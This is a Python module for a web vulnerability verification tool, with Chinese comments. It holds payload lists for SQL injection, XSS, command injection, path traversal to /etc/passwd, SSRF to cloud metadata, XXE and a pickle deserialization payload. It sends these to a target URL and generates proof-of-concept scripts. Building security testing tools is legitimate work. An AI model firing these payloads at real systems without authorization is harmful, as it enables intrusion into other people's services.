#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
enhanced_vuln_verifier模块，提供相关安全测试功能。

模块功能：
    - 提供相关安全测试功能
    - 支持API调用和命令行使用
    - 与其他模块集成协作

注意事项：
    - 本模块仅用于授权的安全测试
    - 请勿用于非法用途
    - 使用前请确保已获得相关授权
"""
import json
import os
import re
import time
import uuid
from typing import Any, Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

import aiohttp
import asyncio

from utils.logger import log


@dataclass
class VerificationResult:
    """验证结果"""
    verification_id: str
    vuln_id: str = ""
    url: str = ""
    vuln_type: str = ""
    is_vulnerable: bool = False
    confidence: str = "low"  # high/medium/low
    confidence_score: float = 0.0  # 0-100
    evidence: str = ""
    payload: str = ""
    request_sample: str = ""
    response_sample: str = ""
    false_positive_reason: str = ""
    poc_script: str = ""
    reproduction_steps: List[str] = field(default_factory=list)
    verification_time: float = 0.0
    verified_at: float = field(default_factory=time.time)
    tags: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        """执行相关操作。

        Returns:
            操作结果。
        """
        return {
            "verification_id": self.verification_id,
            "vuln_id": self.vuln_id,
            "url": self.url,
            "vuln_type": self.vuln_type,
            "is_vulnerable": self.is_vulnerable,
            "confidence": self.confidence,
            "confidence_score": self.confidence_score,
            "evidence": self.evidence,
            "payload": self.payload,
            "false_positive_reason": self.false_positive_reason,
            "poc_script": self.poc_script,
            "reproduction_steps": self.reproduction_steps,
            "verification_time": self.verification_time,
            "verified_at": self.verified_at,
            "tags": self.tags
        }


class EnhancedVulnVerifier:
    """增强漏洞验证器"""

    def __init__(self, data_dir: str = "data/verification"):
        """初始化EnhancedVulnVerifier实例。

        Args:
            self: 类实例。
        """
        self.data_dir = data_dir
        self.results: Dict[str, VerificationResult] = {}
        os.makedirs(data_dir, exist_ok=True)
        self._load_results()

        # 20种漏洞类型的验证规则
        self.verification_rules = {
            "sql_injection": {
                "name": "SQL注入",
                "severity": "critical",
                "cwe": "CWE-89",
                "payloads": [
                    "' OR '1'='1",
                    "' OR 1=1--",
                    "1' AND SLEEP(5)--",
                    "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
                    "' UNION SELECT NULL--",
                    "admin'--",
                ],
                "detection_methods": ["error_based", "time_based", "boolean_based", "union_based"],
                "false_positive_indicators": [
                    "SQL syntax error in application code (not database)",
                    "Generic 500 error without SQL error message",
                    "WAF/IDS blocking the request",
                ],
            },
            "xss": {
                "name": "跨站脚本（XSS）",
                "severity": "high",
                "cwe": "CWE-79",
                "payloads": [
                    "<script>alert(1)</script>",
                    "<img src=x onerror=alert(1)>",
                    "<svg onload=alert(1)>",
                    "javascript:alert(1)",
                    "<body onload=alert(1)>",
                    "<iframe src=javascript:alert(1)>",
                ],
                "detection_methods": ["reflected", "stored", "dom"],
                "false_positive_indicators": [
                    "Payload in URL but not reflected in response",
                    "HTML-encoded output (entities)",
                    "Content-Security-Policy blocking script execution",
                    "Payload reflected in attribute but properly quoted",
                ],
            },
            "command_injection": {
                "name": "命令注入",
                "severity": "critical",
                "cwe": "CWE-78",
                "payloads": [
                    "; id;",
                    "| id |",
                    "&& id &&",
                    "`id`",
                    "$(id)",
                    "; sleep 5;",
                ],
                "detection_methods": ["output_based", "time_based"],
                "false_positive_indicators": [
                    "Command not executed (input sanitized)",
                    "Generic error without command output",
                    "Command executed in sandbox with limited privileges",
                ],
            },
            "path_traversal": {
                "name": "目录遍历",
                "severity": "high",
                "cwe": "CWE-22",
                "payloads": [
                    "../../../../etc/passwd",
                    "..\\..\\..\\..\\windows\\win.ini",
                    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    "....//....//etc/passwd",
                    "/etc/passwd",
                    "file:///etc/passwd",
                ],
                "detection_methods": ["file_content", "error_based"],
                "false_positive_indicators": [
                    "File not found error (404)",
                    "Access denied (403)",
                    "Path normalized by application",
                ],
            },
            "ssrf": {
                "name": "服务器端请求伪造（SSRF）",
                "severity": "high",
                "cwe": "CWE-918",
                "payloads": [
                    "http://127.0.0.1/",
                    "http://localhost/",
                    "http://169.254.169.254/latest/meta-data/",
                    "http://[::1]/",
                    "http://0.0.0.0/",
                    "gopher://127.0.0.1:6379/_INFO",
                ],
                "detection_methods": ["response_based", "time_based", "dns_oob"],
                "false_positive_indicators": [
                    "Request blocked by SSRF protection",
                    "DNS resolution failure",
                    "Connection refused (port closed)",
                ],
            },
            "xxe": {
                "name": "XML外部实体注入（XXE）",
                "severity": "high",
                "cwe": "CWE-611",
                "payloads": [
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><foo>&xxe;</foo>',
                ],
                "detection_methods": ["file_content", "ssrf", "error_based"],
                "false_positive_indicators": [
                    "XML parser configured to disallow DTD",
                    "External entity resolution disabled",
                    "Invalid XML syntax error",
                ],
            },
            "deserialization": {
                "name": "反序列化漏洞",
                "severity": "critical",
                "cwe": "CWE-502",
                "payloads": [
                    "O:8:\"stdClass\":0:{}",
                    "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABeA==",
                    "cos\nsystem\n(S\"id\"\ntR.",
                ],
                "detection_methods": ["rce", "error_based", "time_based"],
                "false_positive_indicators": [
                    "Deserialization exception (class not found)",
                    "Input validation rejecting malicious data",
                    "Safe deserialization library used",
                ],
            },
            "idor": {
                "name": "不安全的直接对象引用（IDOR）",
                "severity": "high",
                "cwe": "CWE-639",
                "payloads": [],
                "detection_methods": ["authorization_bypass", "data_exposure"],
                "false_positive_indicators": [
                    "Object belongs to current user",
                    "Publicly accessible object",
                    "Proper authorization check in place",
                ],
            },
            "open_redirect": {
                "name": "开放重定向",
                "severity": "low",
                "cwe": "CWE-601",
                "payloads": [
                    "https://evil.com",
                    "//evil.com",
                    "/\\evil.com",
                    "https:evil.com",
                    "javascript:alert(1)",
                ],
                "detection_methods": ["redirect_location", "response_based"],
                "false_positive_indicators": [
                    "Redirect to whitelisted domain",
                    "Redirect with user confirmation",
                    "URL validation in place",
                ],
            },
            "cors_misconfiguration": {
                "name": "CORS配置错误",
                "severity": "medium",
                "cwe": "CWE-942",
                "payloads": [],
                "detection_methods": ["header_analysis", "origin_reflection"],
                "false_positive_indicators": [
                    "Access-Control-Allow-Origin: * (public API)",
                    "No credentials allowed",
                    "Proper origin validation",
                ],
            },
            "sensitive_file_exposure": {
                "name": "敏感文件泄露",
                "severity": "medium",
                "cwe": "CWE-538",
                "payloads": [
                    "/.git/config",
                    "/.env",
                    "/backup.sql",
                    "/wp-config.php.bak",
                    "/.DS_Store",
                    "/web.config",
                ],
                "detection_methods": ["file_content", "http_status"],
                "false_positive_indicators": [
                    "File returns 403/404",
                    "File is empty or default",
                    "Directory listing disabled",
                ],
            },
            "weak_password": {
                "name": "弱口令",
                "severity": "high",
                "cwe": "CWE-521",
                "payloads": [],
                "detection_methods": ["brute_force", "dictionary_attack"],
                "false_positive_indicators": [
                    "Account lockout after failed attempts",
                    "CAPTCHA required",
                    "Rate limiting in place",
                ],
            },
            "csrf": {
                "name": "跨站请求伪造（CSRF）",
                "severity": "medium",
                "cwe": "CWE-352",
                "payloads": [],
                "detection_methods": ["token_analysis", "header_check"],
                "false_positive_indicators": [
                    "CSRF token present and validated",
                    "SameSite cookie attribute set",
                    "Custom header required",
                ],
            },
            "insecure_cookie": {
                "name": "不安全的Cookie",
                "severity": "low",
                "cwe": "CWE-614",
                "payloads": [],
                "detection_methods": ["header_analysis"],
                "false_positive_indicators": [
                    "Cookie contains no sensitive data",
                    "Secure flag set for HTTPS only",
                    "HttpOnly flag set appropriately",
                ],
            },
            "missing_security_header": {
                "name": "缺少安全响应头",
                "severity": "low",
                "cwe": "CWE-693",
                "payloads": [],
                "detection_methods": ["header_analysis"],
                "false_positive_indicators": [
                    "Header not applicable to this application",
                    "Alternative protection mechanism in place",
                ],
            },
            "directory_listing": {
                "name": "目录列表",
                "severity": "low",
                "cwe": "CWE-548",
                "payloads": [],
                "detection_methods": ["response_content", "http_status"],
                "false_positive_indicators": [
                    "Directory contains no sensitive files",
                    "Index file present",
                    "Directory listing disabled",
                ],
            },
            "http_method_override": {
                "name": "HTTP方法覆盖",
                "severity": "low",
                "cwe": "CWE-16",
                "payloads": [],
                "detection_methods": ["method_testing", "header_override"],
                "false_positive_indicators": [
                    "Method not supported",
                    "Proper method validation",
                ],
            },
            "mass_assignment": {
                "name": "批量赋值",
                "severity": "high",
                "cwe": "CWE-915",
                "payloads": [
                    '{"is_admin": true, "role": "admin"}',
                    '{"admin": 1, "privilege": "root"}',
                ],
                "detection_methods": ["parameter_injection", "response_analysis"],
                "false_positive_indicators": [
                    "Field not accepted by application",
                    "Proper field whitelist in place",
                    "No privilege change observed",
                ],
            },
            "race_condition": {
                "name": "竞态条件",
                "severity": "high",
                "cwe": "CWE-362",
                "payloads": [],
                "detection_methods": ["concurrency_testing", "repeat_request"],
                "false_positive_indicators": [
                    "Transaction/lock mechanism in place",
                    "Idempotent operation",
                    "No observable business impact",
                ],
            },
        }

        # 误报过滤规则
        self.false_positive_rules = {
            "generic_500": {
                "description": "通用500错误，不包含特定漏洞特征",
                "check": lambda resp: resp.get("status") == 500 and not any(
                    kw in resp.get("body", "").lower() for kw in ["sql", "syntax", "mysql", "oracle", "postgresql", "traceback", "stack trace"]
                ),
                "action": "降低置信度",
            },
            "waf_block": {
                "description": "WAF/IDS拦截请求",
                "check": lambda resp: resp.get("status") in [403, 406, 429] or any(
                    kw in resp.get("body", "").lower() for kw in ["blocked", "waf", "firewall", "access denied", "forbidden"]
                ),
                "action": "标记为WAF拦截，非漏洞",
            },
            "html_encoded": {
                "description": "输出被HTML编码，无法执行",
                "check": lambda resp: all(
                    encoded in resp.get("body", "") for encoded in ["&lt;", "&gt;", "&quot;", "&#x27;"]
                ),
                "action": "标记为已编码，非漏洞",
            },
            "not_reflected": {
                "description": "payload未在响应中反射",
                "check": lambda resp, payload: payload not in resp.get("body", ""),
                "action": "降低置信度",
            },
        }

    def _load_results(self):
        """从文件加载结果"""
        results_file = os.path.join(self.data_dir, "verification_results.json")
        if os.path.exists(results_file):
            try:
                with open(results_file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                for rid, rdata in data.items():
                    self.results[rid] = VerificationResult(
                        verification_id=rdata["verification_id"],
                        vuln_id=rdata.get("vuln_id", ""),
                        url=rdata.get("url", ""),
                        vuln_type=rdata.get("vuln_type", ""),
                        is_vulnerable=rdata.get("is_vulnerable", False),
                        confidence=rdata.get("confidence", "low"),
                        confidence_score=rdata.get("confidence_score", 0),
                        evidence=rdata.get("evidence", ""),
                        payload=rdata.get("payload", ""),
                        false_positive_reason=rdata.get("false_positive_reason", ""),
                        poc_script=rdata.get("poc_script", ""),
                        reproduction_steps=rdata.get("reproduction_steps", []),
                        verification_time=rdata.get("verification_time", 0),
                        verified_at=rdata.get("verified_at", time.time()),
                        tags=rdata.get("tags", [])
                    )
            except Exception as e:
                log.error(f"加载验证结果失败: {e}")

    def _save_results(self):
        """保存结果到文件"""
        results_file = os.path.join(self.data_dir, "verification_results.json")
        try:
            data = {rid: r.to_dict() for rid, r in self.results.items()}
            with open(results_file, 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=2, default=str)
        except Exception as e:
            log.error(f"保存验证结果失败: {e}")

    # ===== 核心验证方法 =====
    def verify_vulnerability(self, url: str, vuln_type: str, parameter: str = "",
                              method: str = "GET", payload: str = "",
                              vuln_id: str = "") -> Dict[str, Any]:
        """验证漏洞（支持20种漏洞类型）"""
        start_time = time.time()
        log.info(f"验证漏洞: {vuln_type} - {url}")

        rule = self.verification_rules.get(vuln_type)
        if not rule:
            return {
                "verified": False,
                "error": f"不支持的漏洞类型: {vuln_type}",
                "supported_types": list(self.verification_rules.keys())
            }

        verification_id = f"ver-{uuid.uuid4().hex[:8]}"
        result = VerificationResult(
            verification_id=verification_id,
            vuln_id=vuln_id,
            url=url,
            vuln_type=vuln_type,
        )

        # 根据漏洞类型执行验证
        if vuln_type in ["sql_injection", "xss", "command_injection", "path_traversal",
                          "ssrf", "open_redirect", "sensitive_file_exposure"]:
            is_vuln, confidence, evidence, used_payload, resp_sample = self._verify_injection_type(
                url, vuln_type, parameter, method, payload, rule
            )
        elif vuln_type in ["xxe", "deserialization"]:
            is_vuln, confidence, evidence, used_payload, resp_sample = self._verify_complex_type(
                url, vuln_type, parameter, method, payload, rule
            )
        elif vuln_type in ["cors_misconfiguration", "insecure_cookie", "missing_security_header",
                            "directory_listing", "http_method_override"]:
            is_vuln, confidence, evidence, resp_sample = self._verify_header_type(
                url, vuln_type, rule
            )
        elif vuln_type in ["idor", "csrf", "mass_assignment", "race_condition", "weak_password"]:
            is_vuln, confidence, evidence = self._verify_logic_type(
                url, vuln_type, parameter, rule
            )
            used_payload = payload
            resp_sample = ""
        else:
            is_vuln, confidence, evidence = False, "low", "未实现的验证类型"
            used_payload = payload
            resp_sample = ""

        # 误报过滤
        false_positive_reason = self._check_false_positive(vuln_type, is_vuln, evidence, resp_sample)
        if false_positive_reason:
            is_vuln = False
            confidence = "low"
            result.false_positive_reason = false_positive_reason

        # 计算置信度分数
        confidence_score = self._calculate_confidence_score(confidence, is_vuln, evidence)

        # 生成POC脚本
        poc_script = self._generate_poc_script(url, vuln_type, parameter, method, used_payload)

        # 生成复现步骤
        reproduction_steps = self._generate_reproduction_steps(url, vuln_type, parameter, method, used_payload, evidence)

        # 填充结果
        result.is_vulnerable = is_vuln
        result.confidence = confidence
        result.confidence_score = confidence_score
        result.evidence = evidence
        result.payload = used_payload
        result.response_sample = resp_sample[:500] if resp_sample else ""
        result.poc_script = poc_script
        result.reproduction_steps = reproduction_steps
        result.verification_time = time.time() - start_time
        result.tags = [vuln_type, rule["severity"], rule["cwe"]]

        self.results[verification_id] = result
        self._save_results()

        return {
            "verification_id": verification_id,
            "vuln_id": vuln_id,
            "url": url,
            "vuln_type": vuln_type,
            "vuln_name": rule["name"],
            "severity": rule["severity"],
            "cwe": rule["cwe"],
            "is_vulnerable": is_vuln,
            "confidence": confidence,
            "confidence_score": confidence_score,
            "evidence": evidence,
            "payload": used_payload,
            "false_positive_reason": false_positive_reason,
            "poc_script": poc_script,
            "reproduction_steps": reproduction_steps,
            "verification_time": round(result.verification_time, 2),
        }

    def _verify_injection_type(self, url, vuln_type, parameter, method, payload, rule):
        """验证注入类漏洞"""
        payloads = [payload] if payload else rule["payloads"][:3]
        is_vuln = False
        confidence = "low"
        evidence = ""
        used_payload = ""
        resp_sample = ""

        try:
            import requests
            for test_payload in payloads:
                try:
                    if method.upper() == "POST":
                        data = {parameter: test_payload} if parameter else test_payload
                        resp = requests.post(url, data=data, timeout=15, verify=False, allow_redirects=False)
                    else:
                        params = {parameter: test_payload} if parameter else {}
                        resp = requests.get(url, params=params, timeout=15, verify=False, allow_redirects=False)

                    text = resp.text
                    status = resp.status_code

                    # 根据漏洞类型检测
                    if vuln_type == "sql_injection":
                        sql_indicators = ["sql syntax", "mysql", "oracle", "postgresql", "sqlserver",
                                          "unclosed quotation", "syntax error", "sqlstate", "odbc"]
                        for indicator in sql_indicators:
                            if indicator in text.lower():
                                is_vuln = True
                                confidence = "high"
                                evidence = f"响应中包含SQL错误: {indicator}"
                                used_payload = test_payload
                                resp_sample = text
                                break
                        # 时间盲注
                        if "sleep" in test_payload.lower() or "waitfor" in test_payload.lower():
                            if resp.elapsed.total_seconds() > 4:
                                is_vuln = True
                                confidence = "high"
                                evidence = f"时间盲注验证成功，响应时间{resp.elapsed.total_seconds():.2f}秒"
                                used_payload = test_payload
                                resp_sample = text

                    elif vuln_type == "xss":
                        if test_payload in text and not any(enc in text for enc in ["&lt;", "&gt;", "&quot;"]):
                            is_vuln = True
                            confidence = "medium"
                            evidence = f"payload未编码反射在响应中: {test_payload[:50]}"
                            used_payload = test_payload
                            resp_sample = text

                    elif vuln_type == "command_injection":
                        cmd_indicators = ["uid=", "gid=", "groups=", "root:", "bin:", "daemon:"]
                        for indicator in cmd_indicators:
                            if indicator in text:
                                is_vuln = True
                                confidence = "high"
                                evidence = f"响应中包含命令执行输出: {indicator}"
                                used_payload = test_payload
                                resp_sample = text
                                break

                    elif vuln_type == "path_traversal":
                        file_indicators = ["root:", "bin:", "daemon:", "[fonts]", "[extensions]",
                                           "microsoft", "windows"]
                        for indicator in file_indicators:
                            if indicator in text.lower():
                                is_vuln = True
                                confidence = "high"
                                evidence = f"响应中包含敏感文件内容: {indicator}"
                                used_payload = test_payload
                                resp_sample = text
                                break

                    elif vuln_type == "ssrf":
                        if status == 200 and len(text) > 50:
                            is_vuln = True
                            confidence = "medium"
                            evidence = f"SSRF请求成功，状态码{status}，响应长度{len(text)}"
                            used_payload = test_payload
                            resp_sample = text

                    elif vuln_type == "open_redirect":
                        if status in [301, 302, 307, 308]:
                            location = resp.headers.get("Location", "")
                            if "evil.com" in location or "javascript:" in location:
                                is_vuln = True
                                confidence = "high"
                                evidence = f"重定向到恶意URL: {location}"
                                used_payload = test_payload
                                resp_sample = text

                    elif vuln_type == "sensitive_file_exposure":
                        if status == 200 and len(text) > 10:
                            is_vuln = True
                            confidence = "medium"
                            evidence = f"敏感文件可访问，状态码{status}，响应长度{len(text)}"
                            used_payload = test_payload
                            resp_sample = text

                    if is_vuln:
                        break
                except Exception as e:
                    continue
        except Exception as e:
            evidence = f"验证出错: {str(e)}"

        return is_vuln, confidence, evidence, used_payload, resp_sample

    def _verify_complex_type(self, url, vuln_type, parameter, method, payload, rule):
        """验证复杂类型漏洞（XXE/反序列化）"""
        payloads = [payload] if payload else rule["payloads"][:2]
        is_vuln = False
        confidence = "low"
        evidence = ""
        used_payload = ""
        resp_sample = ""

        try:
            import requests
            for test_payload in payloads:
                try:
                    headers = {"Content-Type": "application/xml" if vuln_type == "xxe" else "application/x-www-form-urlencoded"}
                    if method.upper() == "POST":
                        data = {parameter: test_payload} if parameter else test_payload
                        resp = requests.post(url, data=data, headers=headers, timeout=15, verify=False)
                    else:
                        params = {parameter: test_payload} if parameter else {}
                        resp = requests.get(url, params=params, headers=headers, timeout=15, verify=False)

                    text = resp.text

                    if vuln_type == "xxe":
                        xxe_indicators = ["root:", "bin:", "daemon:", "[fonts]", "[extensions]",
                                         "failed to load external entity", "java.io.filenotfound"]
                        for indicator in xxe_indicators:
                            if indicator in text.lower():
                                is_vuln = True
                                confidence = "high"
                                evidence = f"XXE验证成功，响应中包含: {indicator}"
                                used_payload = test_payload
                                resp_sample = text
                                break

                    elif vuln_type == "deserialization":
                        deser_indicators = ["uid=", "gid=", "root:", "unserialize", "classnotfound",
                                           "pickle", "unpicklingerror", "invalidclassexception"]
                        for indicator in deser_indicators:
                            if indicator in text.lower():
                                is_vuln = True
                                confidence = "medium"
                                evidence = f"反序列化可能成功，响应中包含: {indicator}"
                                used_payload = test_payload
                                resp_sample = text
                                break

                    if is_vuln:
                        break
                except:
                    continue
        except Exception as e:
            evidence = f"验证出错: {str(e)}"

        return is_vuln, confidence, evidence, used_payload, resp_sample

    def _verify_header_type(self, url, vuln_type, rule):
        """验证Header类漏洞"""
        is_vuln = False
        confidence = "low"
        evidence = ""
        resp_sample = ""

        try:
            import requests
            resp = requests.get(url, timeout=15, verify=False)
            headers = resp.headers
            text = resp.text

            if vuln_type == "cors_misconfiguration":
                acao = headers.get("Access-Control-Allow-Origin", "")
                acac = headers.get("Access-Control-Allow-Credentials", "")
                if acao == "*" and acac == "true":
                    is_vuln = True
                    confidence = "high"
                    evidence = "CORS配置错误: Access-Control-Allow-Origin为*且允许凭证"
                elif acao and acao != "*":
                    # 测试Origin反射
                    test_resp = requests.get(url, headers={"Origin": "https://evil.com"}, timeout=10, verify=False)
                    if test_resp.headers.get("Access-Control-Allow-Origin") == "https://evil.com":
                        is_vuln = True
                        confidence = "high"
                        evidence = "CORS配置错误: Origin被反射，任意域可访问"
                resp_sample = str(dict(headers))

            elif vuln_type == "insecure_cookie":
                set_cookie = headers.get("Set-Cookie", "")
                if set_cookie:
                    if "secure" not in set_cookie.lower() and "https" in url:
                        is_vuln = True
                        confidence = "medium"
                        evidence = "Cookie缺少Secure标志"
                    if "httponly" not in set_cookie.lower():
                        is_vuln = True
                        confidence = "medium"
                        evidence = (evidence + "; " if evidence else "") + "Cookie缺少HttpOnly标志"
                resp_sample = set_cookie

            elif vuln_type == "missing_security_header":
                required_headers = ["X-Content-Type-Options", "X-Frame-Options", "Content-Security-Policy",
                                    "Strict-Transport-Security", "X-XSS-Protection"]
                missing = [h for h in required_headers if h not in headers]
                if missing:
                    is_vuln = True
                    confidence = "low"
                    evidence = f"缺少安全响应头: {', '.join(missing)}"
                resp_sample = str(dict(headers))

            elif vuln_type == "directory_listing":
                if "Index of" in text or "Directory listing" in text or "Parent Directory" in text:
                    is_vuln = True
                    confidence = "high"
                    evidence = "目录列表已启用"
                resp_sample = text[:500]

            elif vuln_type == "http_method_override":
                methods = ["PUT", "DELETE", "TRACE", "CONNECT"]
                for m in methods:
                    try:
                        test_resp = requests.request(m, url, timeout=10, verify=False)
                        if test_resp.status_code not in [405, 501]:
                            is_vuln = True
                            confidence = "low"
                            evidence = f"HTTP方法 {m} 被允许（状态码{test_resp.status_code}）"
                            break
                    except:
                        continue
                resp_sample = str(resp.status_code)

        except Exception as e:
            evidence = f"验证出错: {str(e)}"

        return is_vuln, confidence, evidence, resp_sample

    def _verify_logic_type(self, url, vuln_type, parameter, rule):
        """验证逻辑类漏洞（需要人工确认）"""
        # 逻辑类漏洞无法完全自动化验证，返回low confidence的结果
        is_vuln = False
        confidence = "low"
        evidence = f"{vuln_type}属于逻辑漏洞，需要人工验证确认。已检测到可能的入口点。"
        return is_vuln, confidence, evidence

    def _check_false_positive(self, vuln_type, is_vuln, evidence, resp_sample):
        """检查误报"""
        if not is_vuln:
            return ""

        # 通用500错误
        if "500" in evidence and "internal server error" in resp_sample.lower():
            if not any(kw in evidence.lower() for kw in ["sql", "command", "file", "xxe", "deserial"]):
                return "通用500错误，不包含特定漏洞特征，可能是误报"

        # WAF拦截
        if any(kw in resp_sample.lower() for kw in ["blocked", "waf", "firewall", "access denied"]):
            return "请求被WAF/防火墙拦截，非真实漏洞"

        # HTML编码
        if vuln_type == "xss" and all(enc in resp_sample for enc in ["&lt;", "&gt;"]):
            return "输出被HTML编码，无法执行XSS，非漏洞"

        return ""

    def _calculate_confidence_score(self, confidence, is_vuln, evidence):
        """计算置信度分数（0-100）"""
        base_scores = {"high": 85, "medium": 60, "low": 30}
        score = base_scores.get(confidence, 30)

        if not is_vuln:
            score = min(score, 20)

        # 证据质量加分
        if evidence and len(evidence) > 20:
            score += 5
        if "成功" in evidence or "包含" in evidence:
            score += 5

        return min(score, 100)

    def _generate_poc_script(self, url, vuln_type, parameter, method, payload):
        """生成POC脚本"""
        if not payload:
            return ""

        script = f'''#!/usr/bin/env python3
# {vuln_type}漏洞POC
# 目标: {url}
# 参数: {parameter}
# 方法: {method}

import requests
import urllib3
urllib3.disable_warnings()

url = "{url}"
payload = "{payload}"

if __name__ == "__main__":
    print(f"[*] 测试{vuln_type}漏洞: {{url}}")
    print(f"[*] Payload: {{payload}}")
    '''

        if method.upper() == "POST":
            script += f'''
    data = {{"{parameter}": payload}}
    resp = requests.post(url, data=data, timeout=15, verify=False)
'''
        else:
            script += f'''
    params = {{"{parameter}": payload}}
    resp = requests.get(url, params=params, timeout=15, verify=False)
'''

        script += f'''
    print(f"[*] 状态码: {{resp.status_code}}")
    print(f"[*] 响应长度: {{len(resp.text)}}")
    print(f"[*] 响应内容: {{resp.text[:500]}}")
    if resp.status_code == 200:
        print("[+] 可能存在漏洞，请人工确认")
    else:
        print("[-] 未检测到漏洞")
'''

        return script

    def _generate_reproduction_steps(self, url, vuln_type, parameter, method, payload, evidence):
        """生成复现步骤"""
        steps = [
            f"1. 使用浏览器或代理工具访问 {url}",
            f"2. 拦截请求，将方法设置为 {method}",
        ]

        if parameter and payload:
            steps.append(f"3. 修改参数 {parameter} 的值为: {payload[:100]}")
        elif payload:
            steps.append(f"3. 在请求体中设置payload: {payload[:100]}")

        steps.extend([
            "4. 发送请求，观察响应",
            f"5. 验证证据: {evidence}",
            "6. 确认漏洞的实际影响和可利用性",
        ])

        return steps

    # ===== 批量验证 =====
    def batch_verify(self, vulns: List[Dict[str, Any]]) -> Dict[str, Any]:
        """批量验证漏洞"""
        results = []
        for vuln in vulns:
            result = self.verify_vulnerability(
                url=vuln.get("url", ""),
                vuln_type=vuln.get("vuln_type", ""),
                parameter=vuln.get("parameter", ""),
                method=vuln.get("method", "GET"),
                payload=vuln.get("payload", ""),
                vuln_id=vuln.get("vuln_id", "")
            )
            results.append(result)

        vulnerable_count = sum(1 for r in results if r.get("is_vulnerable"))
        high_confidence = sum(1 for r in results if r.get("confidence") == "high")

        return {
            "total": len(results),
            "vulnerable": vulnerable_count,
            "high_confidence": high_confidence,
            "false_positive_rate": round((len(results) - vulnerable_count) / len(results) * 100, 2) if results else 0,
            "results": results
        }

    # ===== 查询结果 =====
    def get_results(self, vuln_type: str = None, is_vulnerable: bool = None,
                    confidence: str = None) -> List[Dict[str, Any]]:
        """获取验证结果"""
        results = []
        for result in self.results.values():
            if vuln_type and result.vuln_type != vuln_type:
                continue
            if is_vulnerable is not None and result.is_vulnerable != is_vulnerable:
                continue
            if confidence and result.confidence != confidence:
                continue
            results.append(result.to_dict())
        results.sort(key=lambda x: x["verified_at"], reverse=True)
        return results

    def get_statistics(self) -> Dict[str, Any]:
        """获取统计信息"""
        total = len(self.results)
        vulnerable = sum(1 for r in self.results.values() if r.is_vulnerable)
        by_type = {}
        by_confidence = {"high": 0, "medium": 0, "low": 0}
        avg_time = sum(r.verification_time for r in self.results.values()) / total if total > 0 else 0

        for result in self.results.values():
            vtype = result.vuln_type
            by_type[vtype] = by_type.get(vtype, 0) + 1
            by_confidence[result.confidence] = by_confidence.get(result.confidence, 0) + 1

        return {
            "total_verifications": total,
            "vulnerable": vulnerable,
            "false_positive_rate": round((total - vulnerable) / total * 100, 2) if total > 0 else 0,
            "by_type": by_type,
            "by_confidence": by_confidence,
            "average_verification_time": round(avg_time, 2),
            "supported_vuln_types": len(self.verification_rules),
        }


# 全局实例
enhanced_verifier = EnhancedVulnVerifier()
